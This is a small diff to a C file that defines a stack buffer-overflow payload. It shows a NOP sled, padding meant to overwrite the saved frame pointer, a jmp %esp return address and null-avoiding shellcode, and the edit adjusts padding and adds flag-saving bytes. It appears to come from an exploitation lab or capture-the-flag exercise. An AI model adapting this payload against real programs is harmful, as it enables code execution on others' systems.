@@ -74,7 +74,7 @@ unsigned char payload[] =
 	"\x90\x90\x90\x90\x90"
 	"\x90\x90\x90\x90"
 	//Need to overwrite the %ebp though:
-	"\x90\x90\x90\x90"
+	"\x90\x90"
 
 	// // The jmp %esp command location:
 	"\x1d\x90\x04\x08"
@@ -96,9 +96,11 @@ unsigned char payload[] =
 	
 	//"\x68" "\x27\x21\x0a\x00" Push 0xa2127
 	// Pushes a larger value into the register, then subtracts it (takes up 7 more bytes)
+	"\x9f"
 	"\xba\x28\x22\x1a\x01"
 	"\x81\xea\x01\x01\x10\x01"
 	"\x52"
+	"\x9e"
 
 	"\x75\x07"
 	"\x68" "\x61\x67\x20\x36"
